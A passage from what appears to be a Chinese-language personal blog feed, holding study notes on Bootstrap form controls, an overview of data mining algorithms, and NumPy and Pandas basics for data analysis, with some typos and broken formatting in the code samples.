src="//tva3.sinaimg.cn/large/005zbIM7ly1g123aagvwxj30kv06zwen.jpg" alt="img"></li></ul><h5 id="feedback图标"><a href="#feedback图标" class="headerlink" title="feedback图标"></a>feedback图标</h5><p>在<code>.form-group</code>和<code>glyphicon</code>上使用类 <code>.has-feedback</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">form</span><span class="selector-class">.form-horizontal</span></span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.form-group</span><span class="selector-class">.has-success</span><span class="selector-class">.has-feedback</span></span><br><span class="line">        <span class="selector-tag">label</span><span class="selector-class">.control-label</span><span class="selector-class">.col-xs-2</span><span class="selector-attr">[for=inputSuccess]</span>&#123;Usrname&#125;</span><br><span class="line">        <span class="selector-tag">div</span><span class="selector-class">.col-xs-10</span></span><br><span class="line">            input#<span class="selector-attr">[inputSuccess]</span><span class="selector-class">.form-control</span><span class="selector-attr">[placeholder=input with success]</span><span class="selector-attr">[type=text]</span></span><br><span class="line">            <span class="selector-tag">span</span><span class="selector-class">.glyphicon</span><span class="selector-class">.glyphicon-ok</span><span class="selector-class">.formcontrol-feedback</span></span><br><span class="line">            <span class="selector-tag">span</span>.help-block&#123;Username is availabel&#125;</span><br><span class="line">    <span class="selector-tag">div</span><span class="selector-class">.form-group</span><span class="selector-class">.haswarning-has-feedback</span></span><br><span class="line">        ...</span><br><span class="line">            <span class="selector-tag">span</span><span class="selector-class">.glyphicon</span><span class="selector-class">.glyphicon-warning-sign</span><span class="selector-class">.form-control-feedback</span></span><br><span class="line">            ...</span><br><span class="line">    idv<span class="selector-class">.form-group</span><span class="selector-class">.has-error</span><span class="selector-class">.has-feedback</span></span><br><span class="line">        ...</span><br><span class="line">            <span class="selector-tag">span</span><span class="selector-class">.glyphicon</span><span class="selector-class">.glyphicon-remove</span><span class="selector-class">.form-control-feedback</span></span><br><span class="line">            ...</span><br></pre></td></tr></table></figure><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g123laem2aj30io06udg0.jpg" alt="img"><h4 id="单选按钮"><a href="#单选按钮" class="headerlink" title="单选按钮"></a>单选按钮</h4><p>一组按钮仅一个可选</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">script   ..attr(<span class="string">&#x27;checked&#x27;</span>)=&gt; undefind</span><br><span class="line">    $(<span class="string">&#x27;input&#x27;</span>).map(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>($(<span class="built_in">this</span>).is(<span class="string">&#x27;:checked&#x27;</span>))&#123;</span><br><span class="line">        alert($(<span class="built_in">this</span>).attr(<span class="string">&#x27;id&#x27;</span>));</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">css js</span><br><span class="line"></span><br><span class="line">div.btn-group.<span class="attribute">data-toggle</span>=buttons</span><br><span class="line">    label.btn.btn-info.active</span><br><span class="line">        input[<span class="attribute">type</span>=radio][<span class="attribute">name</span>=options][<span class="attribute">cehcked</span>=checked]&#123;Option 1&#125;</span><br><span class="line">    label.btn.btn-<span class="builtin-name">info</span></span><br><span class="line">        input[<span class="attribute">type</span>=radio][<span class="attribute">name</span>=options]&#123;Option 2&#125;</span><br><span class="line">    label.btn.btn-<span class="builtin-name">info</span></span><br><span class="line">        input[<span class="attribute">type</span>=radio][<span class="attribute">name</span>=options]&#123;Option 3&#125;</span><br><span class="line">    </span><br><span class="line">-------</span><br><span class="line">点击一个按钮后，不可取消，只能切换</span><br><span class="line"><span class="attribute">data-toggle</span>=buttons   active    checked  </span><br></pre></td></tr></table></figure><p><a href="http://www.runoob.com/bootstrap/bootstrap-button-plugin.html"><code>data-toggle</code>属性</a></br><br><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g1243akm53j307801lq2s.jpg" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Bootstrap教程笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Bootstrap </tag>
            
            <tag> W3School </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0, 总览</title>
      <link href="/categories/Python/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/0-%E6%80%BB%E8%A7%88/"/>
      <url>/categories/Python/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/0-%E6%80%BB%E8%A7%88/</url>
      
        <content type="html"><![CDATA[<h4 id="数据挖掘的基本流程"><a href="#数据挖掘的基本流程" class="headerlink" title="数据挖掘的基本流程"></a>数据挖掘的基本流程</h4><ol><li>商业理解：</li><li>数据理解:</li><li>数据准备:</li><li>模型建立:</li><li>模型评估:</li><li>上线发布:<h4 id="数据挖掘的算法"><a href="#数据挖掘的算法" class="headerlink" title="数据挖掘的算法"></a>数据挖掘的算法</h4><h5 id="分类算法-C4-5-Naive-Bayes-SVM-KNN-Adaboost-CART"><a href="#分类算法-C4-5-Naive-Bayes-SVM-KNN-Adaboost-CART" class="headerlink" title="分类算法 C4.5,Naive Bayes,SVM,KNN,Adaboost,CART"></a>分类算法 <code>C4.5,Naive Bayes,SVM,KNN,Adaboost,CART</code></h5><h6 id="C4-5"><a href="#C4-5" class="headerlink" title="C4.5"></a>C4.5</h6>决策树算法，(它创造性地在决策树构造过程中就进行了剪枝，并且可以处理连续的属性，也能对不完整的数据进行处理)<h6 id="朴素贝叶斯-Naive-Bayes"><a href="#朴素贝叶斯-Naive-Bayes" class="headerlink" title="朴素贝叶斯(Naive Bayes)"></a>朴素贝叶斯(Naive Bayes)</h6>基于概率论原理，(思想：对于给出的未知物体想要进行分类，就需要求解在这个未知物体出现的条件下各个类别出现的概率，哪个最大，就认为这个未知物体属于哪个分类)。<span id="more"></span><h5 id="聚类算法-K-Means-EM"><a href="#聚类算法-K-Means-EM" class="headerlink" title="聚类算法 K-Means , EM"></a>聚类算法 <code>K-Means , EM</code></h5><h5 id="关联分析-Apriori"><a href="#关联分析-Apriori" class="headerlink" title="关联分析 Apriori"></a>关联分析 <code>Apriori</code></h5><h5 id="连接分析-PageRank"><a href="#连接分析-PageRank" class="headerlink" title="连接分析 PageRank"></a>连接分析 <code>PageRank</code></h5></li></ol><p>极客时间版权所有: <a href="https://time.geekbang.org/column/article/73397">https://time.geekbang.org/column/article/73397</a></p><h4 id="数据挖掘的数学原理"><a href="#数据挖掘的数学原理" class="headerlink" title="数据挖掘的数学原理"></a>数据挖掘的数学原理</h4><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0s0bcelngj30vq0mxtov.jpg" alt="img"><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0s0bpwecoj326d150hdt.jpg" alt="img"><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0s0c9w3yuj30vq0hu4a8.jpg" alt="img"><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0s0cp775cj30vq0j7tjh.jpg" alt="img"><img src="//tva3.sinaimg.cn/large/005zbIM7ly1g0s0gah7iij31do1osb29.jpg" alt="img">]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
          <category> 数据分析 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>1.1 python基础</title>
      <link href="/categories/Python/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/1-1-python%E5%9F%BA%E7%A1%80/"/>
      <url>/categories/Python/%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90/1-1-python%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<h3 id="一、python-基础"><a href="#一、python-基础" class="headerlink" title="一、python 基础"></a>一、python 基础</h3><h4 id="其他链接"><a href="#其他链接" class="headerlink" title="其他链接"></a>其他链接</h4><p> <a href="https://www.cnblogs.com/nxld/p/6756492.html">像Excel一样使用python进行数据分析</a></p><h4 id="1、第三方库-NumPy-矩阵运算"><a href="#1、第三方库-NumPy-矩阵运算" class="headerlink" title="1、第三方库 NumPy - 矩阵运算"></a>1、第三方库 NumPy - 矩阵运算</h4><h5 id="1-ndarray对象"><a href="#1-ndarray对象" class="headerlink" title="(1) ndarray对象"></a>(1) ndarray对象</h5><ul><li>创建数组<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">import</span> numpy as np</span><br><span class="line"><span class="attribute">a</span>=np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],[<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>],[<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]])</span><br><span class="line"><span class="attribute">pirnt</span>(a.shape)  #获得数组大小 (<span class="number">3</span>,<span class="number">3</span>) <span class="number">3</span>行<span class="number">3</span>列</span><br><span class="line"><span class="attribute">print</span>(a.dtype)  #数据类型</span><br></pre></td></tr></table></figure></li><li>结构数组<span id="more"></span><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">persontype=bp.dtype(&#123;</span><br><span class="line">  <span class="string">&#x27;names&#x27;</span>:[<span class="string">&#x27;name&#x27;</span>,<span class="string">&#x27;age&#x27;</span>,<span class="string">&#x27;math&#x27;</span>],</span><br><span class="line">  <span class="string">&#x27;formats&#x27;</span>:[<span class="string">&#x27;S32&#x27;</span>,<span class="string">&#x27;i&#x27;</span>,<span class="string">&#x27;f&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line">peoples=np.array([</span><br><span class="line">  (<span class="string">&#x27;name1&#x27;</span>,<span class="number">20</span>,<span class="number">80.3</span>),(<span class="string">&#x27;name2&#x27;</span>,<span class="number">22</span>,<span class="number">89.5</span>)],dtype=persontype)</span><br><span class="line"><span class="built_in">print</span>(np.mean(ages))</span><br><span class="line"><span class="built_in">print</span>(peoples[:][<span class="string">&#x27;chinese&#x27;</span>])</span><br><span class="line">-----------------------</span><br><span class="line"><span class="comment">#定义数据类型 </span></span><br><span class="line">np.dtype(&#123;<span class="string">&#x27;names&#x27;</span>:[],<span class="string">&#x27;formats&#x27;</span>;[])</span><br><span class="line"><span class="comment">#定义结构数组</span></span><br><span class="line">np.array([(),(),()],dtype=nptype)</span><br><span class="line"><span class="comment">#计算  某个字段平均值</span></span><br><span class="line">np.mean(names_1)</span><br></pre></td></tr></table></figure><h5 id="2-ufunc-运算"><a href="#2-ufunc-运算" class="headerlink" title="(2) ufunc 运算"></a>(2) ufunc 运算</h5></li><li>连续数组的创建<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#等差数组</span></span><br><span class="line">x1=np.arange(<span class="number">1</span>,<span class="number">11</span>,<span class="number">2</span>)  <span class="comment">#初始值，终值，步长</span></span><br><span class="line">x2=np.linspace(<span class="number">1</span>,<span class="number">9</span>,<span class="number">5</span>) <span class="comment">#初始值，终值，元素个数</span></span><br></pre></td></tr></table></figure></li><li>数组间的算数运算<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x1 = np.arange(<span class="number">1</span>,<span class="number">11</span>,<span class="number">2</span>)</span><br><span class="line">x2 = np.linspace(<span class="number">1</span>,<span class="number">9</span>,<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span> np.add(x1, x2)    <span class="comment">#加</span></span><br><span class="line"><span class="built_in">print</span> np.subtract(x1, x2)  <span class="comment">#减</span></span><br><span class="line"><span class="built_in">print</span> np.multiply(x1, x2)  <span class="comment">#乘</span></span><br><span class="line"><span class="built_in">print</span> np.divide(x1, x2)  <span class="comment">#除</span></span><br><span class="line"><span class="built_in">print</span> np.power(x1, x2)  <span class="comment">#次方</span></span><br><span class="line"><span class="built_in">print</span> np.remainder(x1, x2)  <span class="comment">#取余</span></span><br><span class="line"><span class="built_in">print</span> np.mod(x1, x2)  <span class="comment">#取余</span></span><br></pre></td></tr></table></figure></li><li>统计函数<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line">a = np.array([[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>], [<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>], [<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>]])</span><br><span class="line"><span class="built_in">print</span> np.amin(a)    <span class="comment"># [1]</span></span><br><span class="line"><span class="built_in">print</span> np.amin(a,<span class="number">0</span>)   <span class="comment"># axis = 0 轴的最小值 [1,2,3]</span></span><br><span class="line"><span class="built_in">print</span> np.amin(a,<span class="number">1</span>)   <span class="comment"># axis = 1 轴的最小值 [1,4,7]</span></span><br><span class="line"><span class="built_in">print</span> np.amax(a)    <span class="comment"># 最大值</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> np.ptp(a)    <span class="comment">#最大值和最小值之差</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> np.percentile(a, <span class="number">50</span>)  <span class="comment"># 百分位数？50是中位数？</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> np.median(a)   <span class="comment"># 中位数</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> np.mean(a)    <span class="comment"># 平均数</span></span><br><span class="line"></span><br><span class="line">b=np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line">wts = np.array([<span class="number">1</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>])  <span class="comment">#权重</span></span><br><span class="line"><span class="built_in">print</span> np.average(a,weights=wts)  <span class="comment"># 加权平均值</span></span><br><span class="line"></span><br><span class="line">np.std(a)   <span class="comment">#标准差</span></span><br><span class="line">bp.var(a)    <span class="comment"># 方差</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 排序</span></span><br><span class="line">a = np.array([[<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span>],[<span class="number">2</span>,<span class="number">4</span>,<span class="number">1</span>]])</span><br><span class="line"><span class="built_in">print</span> np.sort(a)   <span class="comment"># 默认：axis=-1  最后一个轴  [[2 3 4][1 2 4]]</span></span><br><span class="line"><span class="built_in">print</span> np.sort(a, axis=<span class="literal">None</span>)  <span class="comment"># 扁平化 [1 2 2 3 4 4]</span></span><br><span class="line"><span class="built_in">print</span> np.sort(a, axis=<span class="number">0</span>)  <span class="comment"># 第一个轴  排序</span></span><br><span class="line"><span class="built_in">print</span> np.sort(a, axis=<span class="number">1</span>)  <span class="comment"># 第二个轴  排序</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="2、第三方库-Pandas"><a href="#2、第三方库-Pandas" class="headerlink" title="2、第三方库 Pandas"></a>2、第三方库 Pandas</h4><p>Pandas 可以对数据进行导入、清洗、处理、统计和输出。</p><h5 id="1-Series-字典序列"><a href="#1-Series-字典序列" class="headerlink" title="(1) Series 字典序列"></a>(1) Series 字典序列</h5><pre><code>两个基本属性，index 和 values index 默认是0,1,2,..  也可以自己指定索引</code></pre><ul><li>创建Series<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#两种方式创建</span></span><br><span class="line"><span class="comment">#---------------</span></span><br><span class="line"><span class="attribute">from</span> pandas import Series, DataFrame</span><br><span class="line"><span class="attribute">x1</span> = Series([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line"><span class="attribute">x2</span> = Series(data=[<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>], index=[&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;, &#x27;d&#x27;])</span><br><span class="line"><span class="comment">#---------------</span></span><br><span class="line"><span class="attribute">d</span> = &#123;&#x27;a&#x27;:<span class="number">1</span>, &#x27;b&#x27;:<span class="number">2</span>, &#x27;c&#x27;:<span class="number">3</span>, &#x27;d&#x27;:<span class="number">4</span>&#125;</span><br><span class="line"><span class="attribute">x3</span> = Series(d)</span><br><span class="line"><span class="attribute">print</span> x<span class="number">3</span> </span><br><span class="line"><span class="comment">#---------------</span></span><br></pre></td></tr></table></figure></li></ul><h5 id="2-DataFrame-类似数据库表"><a href="#2-DataFrame-类似数据库表" class="headerlink" title="(2) DataFrame  类似数据库表"></a>(2) DataFrame  类似数据库表</h5><p>index 和 columns<br>DataFrame 看成是有相同索引的Series组成的字典类型</p><ul><li><p>创建</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pandas import Series，DataFrame</span><br><span class="line">data=&#123;<span class="string">&#x27;Chinese&#x27;</span>:[66,95,93,23,54],<span class="string">&#x27;English&#x27;</span>:[65,34,64,87,36],<span class="string">&#x27;Math&#x27;</span>:[45,25,86,76,34]&#125;</span><br><span class="line"><span class="attribute">df1</span>=DataFrame(data)</span><br><span class="line"><span class="attribute">df2</span>=DataFrame(data,index=[<span class="string">&#x27;vhfw&#x27;</span>,<span class="string">&#x27;gryu&#x27;</span>,<span class="string">&#x27;vcyy&#x27;</span>,<span class="string">&#x27;hlvs&#x27;</span>,dmww<span class="string">&#x27;,columns=[&#x27;</span>English<span class="string">&#x27;,&#x27;</span>Math<span class="string">&#x27;,&#x27;</span>Chinese<span class="string">&#x27;])</span></span><br><span class="line"><span class="string">print df1  #  未指定索引，默认 0,1,2，...</span></span><br><span class="line"><span class="string">print df2  #  指定索引</span></span><br><span class="line"><span class="string">----------</span></span><br><span class="line"><span class="string"># df2结果</span></span><br><span class="line"><span class="string">            English  Math  Chinese</span></span><br><span class="line"><span class="string">ZhangFei         65    30       66</span></span><br><span class="line"><span class="string">GuanYu           85    98       95</span></span><br><span class="line"><span class="string">ZhaoYun          92    96       93</span></span><br><span class="line"><span class="string">HuangZhong       88    77       90</span></span><br><span class="line"><span class="string">DianWei          90    90       80</span></span><br></pre></td></tr></table></figure></li><li><p>导入与输出( csv || xlsx ==&gt; xlsx)</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pip <span class="keyword">install </span>xlrd</span><br><span class="line">pip <span class="keyword">install </span>openpyxl</span><br><span class="line">python &gt;&gt;&gt;</span><br><span class="line">    import pandas as pd</span><br><span class="line">    <span class="keyword">score </span>= DataFrame(pd.read_excel(<span class="string">&#x27;datt_in.xlsx&#x27;</span>))  <span class="comment">#导入</span></span><br><span class="line">    <span class="keyword">score.to_excel(&#x27;data_out.xlsx&#x27;) </span>       <span class="comment">#输出</span></span><br><span class="line">    print <span class="keyword">score </span>            <span class="comment">#打印</span></span><br><span class="line">-------------------</span><br><span class="line"><span class="comment">#安装依赖包</span></span><br><span class="line">pip <span class="keyword">install </span>xlrd </span><br><span class="line">pip <span class="keyword">install </span>openpyxl</span><br></pre></td></tr></table></figure></li></ul><h5 id="3-数据清洗-DataFrame操作"><a href="#3-数据清洗-DataFrame操作" class="headerlink" title="(3) 数据清洗(DataFrame操作)"></a>(3) 数据清洗(DataFrame操作)</h5><ul><li>删除(<strong>去异常</strong>)<ul><li>无关的行(列)</li><li>错误的行(列)<ul><li><code>dataFrame.drop(columns=[&#39;colName&#39;])</code></li><li><code>dataFrame.drop(index=[&#39;rowName&#39;])</code></li></ul></li><li>重复的行(列)<ul><li><code>dataFrame.drop_duplicates()</code></li></ul></li></ul></li><li>重命名列名(<strong>易读</strong>)<ul><li><code>dataFrame.rename(columns=&#123;&#39;colName1&#39;:&#39;rename1&#39;,&#39;English&#39;:&#39;rename&#39;&#125;,inplace=True)</code></li></ul></li><li>格式化 (<strong>去异常+易读？</strong>)<ul><li>更改数据格式<ul><li><code>dataFrame[&#39;colName1&#39;].astype(&#39;str&#39;)        .astype(np.int64)</code></li></ul></li><li>删除数据间的空格、特殊符号$<ul><li><code>dataFrame[&#39;colName1&#39;]=dataFrame[&#39;colName1&#39;].map(str.strip)  lstrip  rstrip</code></li><li><code>dataFrame[&#39;colName1&#39;]=dataFrame[&#39;colName1&#39;].str.strip(&#39;$&#39;) </code></li></ul></li><li>大小写转换<ul><li><code>dataFrame.columns=dataFrame.columns.str.upper()</code></li><li><code>大写:upper()    小写:lower()    首字母大小:str.title()</code></li><li><code>df.[colname1] 对列的值 ||  dr.columns  对列名操作</code></li></ul></li><li>查找空值<ul><li><code>dataFrame.isnull()</code></br><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g16yih484lj306302r74l.jpg" alt="img"></li><li><code>dataFrame.isnull().any()</code>  哪列存在空值</br><img src="//tva3.sinaimg.cn/mw690/005zbIM7ly1g16yj1qflsj303101xwee.jpg" alt="img"></li></ul></li></ul></li><li>辅助函数 <strong>apply(func)</strong><ul><li>传入内置函数，例如大小写转换<ul><li><code>dataFrame[&#39;colName1&#39;]=dataFrame[&#39;colName1&#39;].apply(str.upper)</code></li></ul></li><li>传入自定义函数，例如新增一个列，通过两个列计算得到的值<ul><li>```<br>  def plus(df,n):<pre><code>  df[&quot;new1&quot;]=(df[&#39;col1&#39;]+df[&#39;col2&#39;])*m  return df</code></pre><h2 id="dataFrame-dataFrame-apply-plus-axis-1-args-2"><a href="#dataFrame-dataFrame-apply-plus-axis-1-args-2" class="headerlink" title="  dataFrame=dataFrame.apply(plus,axis=1,args=(2))"></a>  dataFrame=dataFrame.apply(plus,axis=1,args=(2))</h2>  plus是函数名，axis=1|0 代表是 行|列 操作，args是传递的参数。<br>  dataFrame.apply  第一个传入的参数是 dataFrame<br>  dataFrame[colName1].apply  第一个传入的参数是 dataFrame[colName1]<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##### (4) 数据统计(函数)</span></span><br><span class="line">|<span class="string">函数</span>|<span class="string">作用</span>|</span><br><span class="line">|<span class="string">:--:</span>|<span class="string">:----:</span>|</span><br><span class="line">|<span class="string">count()</span>|<span class="string">统计个数(空值NaN不计入)</span>|</span><br><span class="line">|<span class="string">min()</span>|<span class="string">最小值</span>|</span><br><span class="line">|<span class="string">max()</span>|<span class="string">最大值</span>|</span><br><span class="line">|<span class="string">sum()</span>|<span class="string">总和</span>|</span><br><span class="line">|<span class="string">mean()</span>|<span class="string">平均值</span>|</span><br><span class="line">|<span class="string">median()</span>|<span class="string">中位数</span>|</span><br><span class="line">|<span class="string">var()</span>|<span class="string">方差</span>|</span><br><span class="line">|<span class="string">std()</span>|<span class="string">标准差</span>|</span><br><span class="line">|<span class="string">argmin()</span>|<span class="string">统计最小值的索引位置</span>|</span><br><span class="line">|<span class="string">argmax()</span>|<span class="string">统计最大值的所有位置</span>|</span><br><span class="line">|<span class="string">idxmin()</span>|<span class="string">统计最小值的索引值</span>|</span><br><span class="line">|<span class="string">idxmax()</span>|<span class="string">统计最大值的索引值</span>|</span><br><span class="line">|<span class="string">describe()</span>|<span class="string">一次性输出多个统计指标&lt;/br&gt;(count,mean,std,min,max等)</span>|</span><br><span class="line"></span><br><span class="line"><span class="comment">##### (5)数据表合并</span></span><br><span class="line">当我们有多个渠道源的数据表时，需要进行合并</span><br></pre></td></tr></table></figure><h1 id="数据表1，数据表2-进行合并操作"><a href="#数据表1，数据表2-进行合并操作" class="headerlink" title="数据表1，数据表2 进行合并操作"></a>数据表1，数据表2 进行合并操作</h1>df1 = DataFrame({‘name’:[‘ZhangFei’, ‘GuanYu’, ‘a’, ‘b’, ‘c’], ‘data1’:range(5)})<br>df2 = DataFrame({‘name’:[‘ZhangFei’, ‘GuanYu’, ‘A’, ‘B’, ‘C’], ‘data2’:range(5)})<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">- </span>基于指定列</span><br></pre></td></tr></table></figure>df3=pd.merge(df1,df2,on=’name’)</li></ul></li></ul><hr>#基于列 name 进行合并，当df1[‘name’]和df2[‘name’] 的字段值相同时合并<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  &lt;img <span class="attribute">src</span>=<span class="string">&quot;//tva3.sinaimg.cn/thumbnail/005zbIM7ly1g10zdj0ugej306o03mt8t.jpg&quot;</span> <span class="attribute">alt</span>=<span class="string">&quot;img&quot;</span>&gt;</span><br><span class="line">- inner 内连接(merge 默认 内连接)</span><br></pre></td></tr></table></figure><h2 id="df3-pd-merge-df1-df2-how-’inner’"><a href="#df3-pd-merge-df1-df2-how-’inner’" class="headerlink" title="df3=pd.merge(df1,df2,how=’inner’)"></a>df3=pd.merge(df1,df2,how=’inner’)</h2>#基于相同的键(name)做连接,结果同 基于列 name 连接<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">- <span class="built_in">left</span> 左连接 | <span class="type">right</span> 右连接</span><br></pre></td></tr></table></figure>df3 = pd.merge(df1, df2, how=’left’)<h2 id="df3-pd-merge-df1-df2-how-’right’"><a href="#df3-pd-merge-df1-df2-how-’right’" class="headerlink" title="df3 = pd.merge(df1, df2, how=’right’)"></a>df3 = pd.merge(df1, df2, how=’right’)</h2>left 以第一个 DataFrame 为主进行的连接<br>right 以第二个 DataFrame 为主进行的连接<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">  &lt;img <span class="attribute">src</span>=<span class="string">&quot;//tva3.sinaimg.cn/thumbnail/005zbIM7ly1g10zd0gvudj306u05hq39.jpg&quot;</span> <span class="attribute">alt</span>=<span class="string">&quot;img](https://tva3.sinaimg.cn/thumbnail/005zbIM7ly1g10zccuvprj306p054jrp.jpg)![img&quot;</span>&gt;</span><br><span class="line">- outer 外连接 (取并集)</span><br></pre></td></tr></table></figure>df3 = pd.merge(df1, df2, how=’outer’)<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">  &lt;img src=<span class="string">&quot;//tva3.sinaimg.cn/thumbnail/005zbIM7ly1g10zghuk1dj306203uwec.jpg&quot;</span> alt=<span class="string">&quot;img&quot;</span>&gt;</span><br><span class="line">  </span><br><span 